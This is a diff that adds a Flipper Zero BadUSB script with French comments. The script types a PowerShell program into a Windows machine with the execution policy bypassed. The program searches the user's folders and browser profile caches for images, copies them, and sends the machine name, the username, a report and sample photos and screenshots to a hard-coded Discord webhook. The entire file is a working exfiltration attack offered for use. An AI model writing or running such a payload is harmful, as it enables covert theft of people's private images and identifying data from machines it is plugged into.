@@ -1,0 +1,673 @@
+REM ================================================================
+REM Flipper Zero BadUSB - Extraction Intelligente + Webhook
+REM ================================================================
+REM Nom: Smart Webhook Extractor
+REM Description: Extraction optimisée avec IA + envoi Discord automatique
+REM Cible: Windows 7/8/10/11 (PowerShell 3.0+)
+REM Auteur: Plume-Paopedia
+REM Version: 2.1
+REM Durée: 8-20 minutes
+REM Privilèges: Utilisateur standard
+REM Spécialités: Déduplication, classification, rapport complet
+REM ================================================================
+
+DEFAULT_DELAY 350
+
+REM Ouverture PowerShell optimisée
+GUI r
+DELAY 500
+STRING powershell -ExecutionPolicy Bypass -NoProfile
+ENTER
+DELAY 1200
+
+STRING try {
+ENTER
+DELAY 200
+
+STRING # Configuration et constantes
+ENTER
+STRING $WEBHOOK = "https://discordapp.com/api/webhooks/1416477793264603249/dxrIG93WCYqELVdSEXtQ7aqioc3MglF1m06Kee476so3zrsRllBg"
+ENTER
+STRING $MAX_FILE_SIZE = 7MB  # Limite Discord
+ENTER
+STRING $MAX_IMAGE_SIZE = 50MB
+ENTER
+STRING $MIN_IMAGE_SIZE = 5KB
+ENTER
+DELAY 200
+
+STRING # Fonction d'envoi Discord avancée
+ENTER
+STRING function Send-ToDiscord {
+ENTER
+STRING   param([string]$message, [string]$filePath = $null, [switch]$isImage)
+ENTER
+STRING   try {
+ENTER
+STRING     if ($filePath -and (Test-Path $filePath)) {
+ENTER
+STRING       $fileSize = (Get-Item $filePath).Length
+ENTER
+STRING       if ($fileSize -gt $MAX_FILE_SIZE) {
+ENTER
+STRING         Send-ToDiscord "⚠️ Fichier trop volumineux: $(Split-Path $filePath -Leaf) ($([math]::Round($fileSize/1MB,1))MB)"
+ENTER
+STRING         return
+ENTER
+STRING       }
+ENTER
+STRING       # Envoi avec fichier
+ENTER
+STRING       $boundary = [Guid]::NewGuid().ToString()
+ENTER
+STRING       $headers = @{'Content-Type' = "multipart/form-data; boundary=$boundary"}
+ENTER
+STRING       $fileContent = [IO.File]::ReadAllBytes($filePath)
+ENTER
+STRING       $fileName = [IO.Path]::GetFileName($filePath)
+ENTER
+STRING       $body = "--$boundary`r`nContent-Disposition: form-data; name=`"content`"`r`n`r`n$message`r`n--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$fileName`"`r`nContent-Type: $( if($isImage) {'image/jpeg'} else {'text/plain'} )`r`n`r`n"
+ENTER
+STRING       $bodyBytes = [Text.Encoding]::UTF8.GetBytes($body)
+ENTER
+STRING       $endBoundary = [Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--`r`n")
+ENTER
+STRING       $fullBody = $bodyBytes + $fileContent + $endBoundary
+ENTER
+STRING       $response = Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body $fullBody -Headers $headers
+ENTER
+STRING       Start-Sleep 1  # Anti rate-limit
+ENTER
+STRING     } else {
+ENTER
+STRING       # Envoi message seul
+ENTER
+STRING       $payload = @{content = $message} | ConvertTo-Json
+ENTER
+STRING       Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body $payload -ContentType 'application/json'
+ENTER
+STRING       Start-Sleep 0.5
+ENTER
+STRING     }
+ENTER
+STRING   } catch {
+ENTER
+STRING     Write-Host "❌ Erreur Discord: $($_.Exception.Message)" -ForegroundColor Red
+ENTER
+STRING     Start-Sleep 2
+ENTER
+STRING   }
+ENTER
+STRING }
+ENTER
+DELAY 400
+
+STRING # Initialisation
+ENTER
+STRING $startTime = Get-Date
+ENTER
+STRING Write-Host '🧠 Smart Webhook Extractor - Démarrage...' -ForegroundColor Green
+ENTER
+STRING Send-ToDiscord "🧠 **Smart Extraction démarrée** sur **$(hostname)**`n⏰ Début: $(Get-Date -Format 'HH:mm:ss')"
+ENTER
+DELAY 300
+
+STRING # Création dossier intelligent
+ENTER
+STRING $basePath = "$env:USERPROFILE\Desktop\Smart_Extract_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
+ENTER
+STRING $categoriesPath = @{
+ENTER
+STRING   'HighQuality' = "$basePath\01_Photos_HauteQualite"
+ENTER
+STRING   'Screenshots' = "$basePath\02_Screenshots"
+ENTER
+STRING   'Recent' = "$basePath\03_Images_Recentes" 
+ENTER
+STRING   'Cache' = "$basePath\04_Cache_Navigateurs"
+ENTER
+STRING   'Other' = "$basePath\05_Autres_Images"
+ENTER
+STRING }
+ENTER
+STRING New-Item -ItemType Directory -Path $basePath -Force | Out-Null
+ENTER
+STRING foreach ($category in $categoriesPath.Values) { New-Item -ItemType Directory -Path $category -Force | Out-Null }
+ENTER
+STRING Set-Location $basePath
+ENTER
+DELAY 300
+
+STRING # Configuration extraction intelligente
+ENTER
+STRING $extensions = @('*.jpg','*.jpeg','*.png','*.gif','*.bmp','*.webp','*.ico','*.tiff','*.tif','*.jfif','*.heic','*.avif','*.svg')
+ENTER
+STRING $locations = @{
+ENTER
+STRING   'Pictures' = @{path="$env:USERPROFILE\Pictures"; priority=1}
+ENTER
+STRING   'Desktop' = @{path="$env:USERPROFILE\Desktop"; priority=2}
+ENTER
+STRING   'Documents' = @{path="$env:USERPROFILE\Documents"; priority=3}
+ENTER
+STRING   'Downloads' = @{path="$env:USERPROFILE\Downloads"; priority=2}
+ENTER
+STRING   'OneDrive' = @{path="$env:USERPROFILE\OneDrive"; priority=3}
+ENTER
+STRING   'Chrome' = @{path="$env:LOCALAPPDATA\Google\Chrome\User Data"; priority=4}
+ENTER
+STRING   'Firefox' = @{path="$env:APPDATA\Mozilla\Firefox\Profiles"; priority=4}
+ENTER
+STRING   'Edge' = @{path="$env:LOCALAPPDATA\Microsoft\Edge\User Data"; priority=4}
+ENTER
+STRING }
+ENTER
+DELAY 300
+
+STRING # Variables de tracking
+ENTER
+STRING $stats = @{
+ENTER
+STRING   processed = 0; extracted = 0; duplicates = 0; errors = 0; totalSize = 0
+ENTER
+STRING }
+ENTER
+STRING $hashCache = @{}
+ENTER
+STRING $extractedFiles = @{}
+ENTER
+STRING $errors = @()
+ENTER
+STRING $recentLimit = (Get-Date).AddDays(-7)
+ENTER
+DELAY 200
+
+STRING # Fonction de classification intelligente
+ENTER
+STRING function Classify-Image {
+ENTER
+STRING   param($file)
+ENTER
+STRING   $size = $file.Length
+ENTER
+STRING   $name = $file.Name.ToLower()
+ENTER
+STRING   $lastWrite = $file.LastWriteTime
+ENTER
+STRING   
+ENTER
+STRING   # Screenshots (patterns de nom)
+ENTER
+STRING   if ($name -match '(screen|capture|shot|snip|grab|print)') {
+ENTER
+STRING     return 'Screenshots'
+ENTER
+STRING   }
+ENTER
+STRING   
+ENTER
+STRING   # Images récentes et de haute qualité
+ENTER
+STRING   if ($lastWrite -gt $recentLimit -and $size -gt 2MB) {
+ENTER
+STRING     return 'HighQuality'
+ENTER
+STRING   }
+ENTER
+STRING   
+ENTER
+STRING   # Images récentes
+ENTER
+STRING   if ($lastWrite -gt $recentLimit) {
+ENTER
+STRING     return 'Recent'
+ENTER
+STRING   }
+ENTER
+STRING   
+ENTER
+STRING   # Images haute qualité (> 1MB)
+ENTER
+STRING   if ($size -gt 1MB) {
+ENTER
+STRING     return 'HighQuality'
+ENTER
+STRING   }
+ENTER
+STRING   
+ENTER
+STRING   # Cache navigateurs
+ENTER
+STRING   if ($file.DirectoryName -match '(chrome|firefox|edge|cache)') {
+ENTER
+STRING     return 'Cache'
+ENTER
+STRING   }
+ENTER
+STRING   
+ENTER
+STRING   return 'Other'
+ENTER
+STRING }
+ENTER
+DELAY 400
+
+STRING # Fonction de déduplication par hash
+ENTER
+STRING function Get-FileHash-Fast {
+ENTER
+STRING   param($filePath)
+ENTER
+STRING   try {
+ENTER
+STRING     $stream = [System.IO.File]::OpenRead($filePath)
+ENTER
+STRING     $hash = [System.Security.Cryptography.MD5]::Create().ComputeHash($stream)
+ENTER
+STRING     $stream.Close()
+ENTER
+STRING     return [BitConverter]::ToString($hash).Replace('-','').ToLower()
+ENTER
+STRING   } catch {
+ENTER
+STRING     return $null
+ENTER
+STRING   }
+ENTER
+STRING }
+ENTER
+DELAY 300
+
+STRING # Processus d'extraction principal
+ENTER
+STRING Write-Host '🔍 Début du scan intelligent...' -ForegroundColor Yellow
+ENTER
+STRING foreach ($locationKey in ($locations.Keys | Sort-Object {$locations[$_].priority})) {
+ENTER
+STRING   $locationInfo = $locations[$locationKey]
+ENTER
+STRING   $locationPath = $locationInfo.path
+ENTER
+STRING   
+ENTER
+STRING   if (-not (Test-Path $locationPath)) {
+ENTER
+STRING     $errors += "Dossier introuvable: $locationPath"
+ENTER
+STRING     continue
+ENTER
+STRING   }
+ENTER
+STRING   
+ENTER
+STRING   Write-Host "📂 Scan $locationKey`: $locationPath" -ForegroundColor Cyan
+ENTER
+STRING   Send-ToDiscord "📂 **Scan en cours:** $locationKey"
+ENTER
+STRING   
+ENTER
+STRING   foreach ($ext in $extensions) {
+ENTER
+STRING     try {
+ENTER
+STRING       $files = Get-ChildItem -Path $locationPath -Filter $ext -Recurse -Force -ErrorAction SilentlyContinue | 
+ENTER
+STRING         Where-Object { $_.Length -gt $MIN_IMAGE_SIZE -and $_.Length -lt $MAX_IMAGE_SIZE -and -not $_.PSIsContainer }
+ENTER
+STRING       
+ENTER
+STRING       foreach ($file in $files) {
+ENTER
+STRING         try {
+ENTER
+STRING           $stats.processed++
+ENTER
+STRING           
+ENTER
+STRING           # Déduplication par hash
+ENTER
+STRING           $hash = Get-FileHash-Fast $file.FullName
+ENTER
+STRING           if ($hash -and $hashCache.ContainsKey($hash)) {
+ENTER
+STRING             $stats.duplicates++
+ENTER
+STRING             continue
+ENTER
+STRING           }
+ENTER
+STRING           if ($hash) { $hashCache[$hash] = $file.FullName }
+ENTER
+STRING           
+ENTER
+STRING           # Classification intelligente
+ENTER
+STRING           $category = Classify-Image $file
+ENTER
+STRING           $targetPath = $categoriesPath[$category]
+ENTER
+STRING           
+ENTER
+STRING           # Génération nom unique et descriptif
+ENTER
+STRING           $prefix = switch ($category) {
+ENTER
+STRING             'HighQuality' { 'HQ' }
+ENTER
+STRING             'Screenshots' { 'SCR' }
+ENTER
+STRING             'Recent' { 'REC' }
+ENTER
+STRING             'Cache' { 'CACHE' }
+ENTER
+STRING             default { 'IMG' }
+ENTER
+STRING           }
+ENTER
+STRING           $timestamp = $file.LastWriteTime.ToString('MMdd_HHmm')
+ENTER
+STRING           $sizeKB = [math]::Round($file.Length/1KB)
+ENTER
+STRING           $newName = "$prefix`_$timestamp`_$sizeKB`KB_$($stats.extracted)" + $file.Extension
+ENTER
+STRING           
+ENTER
+STRING           # Copie du fichier
+ENTER
+STRING           $destPath = Join-Path $targetPath $newName
+ENTER
+STRING           Copy-Item $file.FullName -Destination $destPath -ErrorAction Stop
+ENTER
+STRING           
+ENTER
+STRING           # Mise à jour statistiques
+ENTER
+STRING           $stats.extracted++
+ENTER
+STRING           $stats.totalSize += $file.Length
+ENTER
+STRING           $extractedFiles[$category] = @($extractedFiles[$category]) + @($destPath)
+ENTER
+STRING           
+ENTER
+STRING           # Rapport de progression
+ENTER
+STRING           if ($stats.extracted % 50 -eq 0) {
+ENTER
+STRING             Write-Host "⚡ $($stats.extracted) images extraites ($($stats.duplicates) doublons évités)" -ForegroundColor Green
+ENTER
+STRING             Send-ToDiscord "⚡ **Progression:** $($stats.extracted) extraites | $($stats.duplicates) doublons évités | $([math]::Round($stats.totalSize/1MB,1)) MB"
+ENTER
+STRING           }
+ENTER
+STRING           
+ENTER
+STRING         } catch {
+ENTER
+STRING           $stats.errors++
+ENTER
+STRING           $errors += "Erreur $($file.FullName)`: $($_.Exception.Message)"
+ENTER
+STRING         }
+ENTER
+STRING       }
+ENTER
+STRING     } catch {
+ENTER
+STRING       $errors += "Erreur scan $locationPath avec $ext`: $($_.Exception.Message)"
+ENTER
+STRING     }
+ENTER
+STRING   }
+ENTER
+STRING }
+ENTER
+DELAY 600
+
+STRING # Génération du rapport final
+ENTER
+STRING $duration = (Get-Date) - $startTime
+ENTER
+STRING $reportData = @()
+ENTER
+STRING $reportData += "════════════════════════════════════════════"
+ENTER
+STRING $reportData += "RAPPORT SMART EXTRACTION + WEBHOOK"
+ENTER
+STRING $reportData += "════════════════════════════════════════════"
+ENTER
+STRING $reportData += "Date: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+ENTER
+STRING $reportData += "Machine: $(hostname)"
+ENTER
+STRING $reportData += "Utilisateur: $env:USERNAME"
+ENTER
+STRING $reportData += "Durée: $($duration.Minutes)min $($duration.Seconds)s"
+ENTER
+STRING $reportData += ""
+ENTER
+STRING $reportData += "STATISTIQUES GLOBALES:"
+ENTER
+STRING $reportData += "• Fichiers analysés: $($stats.processed)"
+ENTER
+STRING $reportData += "• Images extraites: $($stats.extracted)"
+ENTER
+STRING $reportData += "• Doublons évités: $($stats.duplicates)"
+ENTER
+STRING $reportData += "• Erreurs: $($stats.errors)"
+ENTER
+STRING $reportData += "• Taille totale: $([math]::Round($stats.totalSize/1MB,2)) MB"
+ENTER
+STRING $reportData += "• Efficacité: $([math]::Round((1-$stats.duplicates/[Math]::Max(1,$stats.processed))*100,1))%"
+ENTER
+STRING $reportData += ""
+ENTER
+
+STRING # Détail par catégorie
+ENTER
+STRING foreach ($category in $categoriesPath.Keys) {
+ENTER
+STRING   $count = ($extractedFiles[$category] | Measure-Object).Count
+ENTER
+STRING   if ($count -gt 0) {
+ENTER
+STRING     $reportData += "CATÉGORIE $category`: $count images"
+ENTER
+STRING     $sampleFiles = $extractedFiles[$category] | Select-Object -First 5
+ENTER
+STRING     foreach ($sample in $sampleFiles) {
+ENTER
+STRING       $reportData += "  • $(Split-Path $sample -Leaf)"
+ENTER
+STRING     }
+ENTER
+STRING     if ($count -gt 5) { $reportData += "  ... et $($count-5) autres" }
+ENTER
+STRING     $reportData += ""
+ENTER
+STRING   }
+ENTER
+STRING }
+ENTER
+
+STRING # Erreurs détaillées
+ENTER
+STRING if ($errors.Count -gt 0) {
+ENTER
+STRING   $reportData += "ERREURS DÉTAILLÉES:"
+ENTER
+STRING   foreach ($error in $errors) { $reportData += "• $error" }
+ENTER
+STRING   $reportData += ""
+ENTER
+STRING }
+ENTER
+DELAY 300
+
+STRING # Sauvegarde du rapport
+ENTER
+STRING $reportFile = ".\SMART_EXTRACTION_REPORT.txt"
+ENTER
+STRING $reportData | Out-File -FilePath $reportFile -Encoding UTF8
+ENTER
+
+STRING # Envoi du rapport de synthèse Discord
+ENTER
+STRING $finalSummary = "🎯 **Smart Extraction Terminée!**`n`n"
+ENTER
+STRING $finalSummary += "📊 **Statistiques:**`n"
+ENTER
+STRING $finalSummary += "• **Machine:** $(hostname)`n"
+ENTER
+STRING $finalSummary += "• **Utilisateur:** $env:USERNAME`n"
+ENTER
+STRING $finalSummary += "• **Durée:** $($duration.Minutes)min $($duration.Seconds)s`n"
+ENTER
+STRING $finalSummary += "• **Images extraites:** $($stats.extracted)/$($stats.processed)`n"
+ENTER
+STRING $finalSummary += "• **Doublons évités:** $($stats.duplicates)`n"
+ENTER
+STRING $finalSummary += "• **Taille totale:** $([math]::Round($stats.totalSize/1MB,2)) MB`n"
+ENTER
+STRING $finalSummary += "• **Efficacité:** $([math]::Round((1-$stats.duplicates/[Math]::Max(1,$stats.processed))*100,1))%`n`n"
+ENTER
+
+STRING # Détail des catégories pour Discord
+ENTER
+STRING $finalSummary += "📁 **Répartition par catégorie:**`n"
+ENTER
+STRING foreach ($category in $categoriesPath.Keys) {
+ENTER
+STRING   $count = ($extractedFiles[$category] | Measure-Object).Count
+ENTER
+STRING   if ($count -gt 0) {
+ENTER
+STRING     $emoji = switch ($category) {
+ENTER
+STRING       'HighQuality' { '⭐' }
+ENTER
+STRING       'Screenshots' { '📸' }  
+ENTER
+STRING       'Recent' { '🆕' }
+ENTER
+STRING       'Cache' { '💾' }
+ENTER
+STRING       default { '🖼️' }
+ENTER
+STRING     }
+ENTER
+STRING     $finalSummary += "• $emoji **$category**: $count images`n"
+ENTER
+STRING   }
+ENTER
+STRING }
+ENTER
+
+STRING if ($stats.errors -gt 0) {
+ENTER
+STRING   $finalSummary += "`n⚠️ **Erreurs:** $($stats.errors) (voir rapport détaillé)"
+ENTER
+STRING }
+ENTER
+
+STRING Send-ToDiscord $finalSummary
+ENTER
+DELAY 500
+
+STRING # Envoi du rapport détaillé
+ENTER
+STRING if (Test-Path $reportFile) {
+ENTER
+STRING   Send-ToDiscord "📄 **Rapport détaillé Smart Extraction**" $reportFile
+ENTER
+STRING }
+ENTER
+DELAY 300
+
+STRING # Envoi d'échantillons d'images par catégorie
+ENTER
+STRING Write-Host '📤 Envoi échantillons images...' -ForegroundColor Green
+ENTER
+STRING foreach ($category in @('HighQuality','Screenshots','Recent')) {
+ENTER
+STRING   $categoryFiles = $extractedFiles[$category]
+ENTER
+STRING   if ($categoryFiles -and $categoryFiles.Count -gt 0) {
+ENTER
+STRING     $sampleCount = [Math]::Min(3, $categoryFiles.Count)
+ENTER
+STRING     $emoji = switch ($category) {
+ENTER
+STRING       'HighQuality' { '⭐' }
+ENTER
+STRING       'Screenshots' { '📸' }  
+ENTER
+STRING       'Recent' { '🆕' }
+ENTER
+STRING     }
+ENTER
+STRING     Send-ToDiscord "$emoji **Échantillon $category** ($sampleCount/$($categoryFiles.Count)):"
+ENTER
+STRING     for ($i = 0; $i -lt $sampleCount; $i++) {
+ENTER
+STRING       $samplePath = $categoryFiles[$i]
+ENTER
+STRING       if ((Test-Path $samplePath) -and ((Get-Item $samplePath).Length -lt $MAX_FILE_SIZE)) {
+ENTER
+STRING         $fileName = Split-Path $samplePath -Leaf
+ENTER
+STRING         Send-ToDiscord "Image $($i+1): $fileName" $samplePath -isImage
+ENTER
+STRING         Start-Sleep 2
+ENTER
+STRING       }
+ENTER
+STRING     }
+ENTER
+STRING   }
+ENTER
+STRING }
+ENTER
+DELAY 400
+
+STRING # Message de fin
+ENTER
+STRING Write-Host '✅ Smart Extraction terminée!' -ForegroundColor Green
+ENTER
+STRING Write-Host "📊 $($stats.extracted) images extraites en $($duration.Minutes)min $($duration.Seconds)s" -ForegroundColor White
+ENTER
+STRING Write-Host "📂 Dossier: $basePath" -ForegroundColor Cyan
+ENTER
+STRING Write-Host "💾 $([math]::Round($stats.totalSize/1MB,2)) MB | $($stats.duplicates) doublons évités" -ForegroundColor Yellow
+ENTER
+
+STRING # Ouverture du dossier de résultats
+ENTER
+STRING if ($stats.extracted -gt 0) { 
+ENTER
+STRING   Start-Process explorer $basePath
+ENTER
+STRING }
+ENTER
+
+STRING } catch {
+ENTER
+STRING   $criticalError = "💥 **ERREUR CRITIQUE Smart Extraction**`n**Machine:** $(hostname)`n**Erreur:** $($_.Exception.Message)`n**Ligne:** $($_.InvocationInfo.ScriptLineNumber)"
+ENTER
+STRING   try {
+ENTER
+STRING     Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body (@{content=$criticalError}|ConvertTo-Json) -ContentType 'application/json'
+ENTER
+STRING   } catch { }
+ENTER
+STRING   Write-Host $criticalError -ForegroundColor Red
+ENTER
+STRING }
+ENTER
+
+STRING Write-Host "`nAppuyez sur Entrée pour fermer..."
+ENTER
+STRING Read-Host
+ENTER
+STRING exit
+ENTER
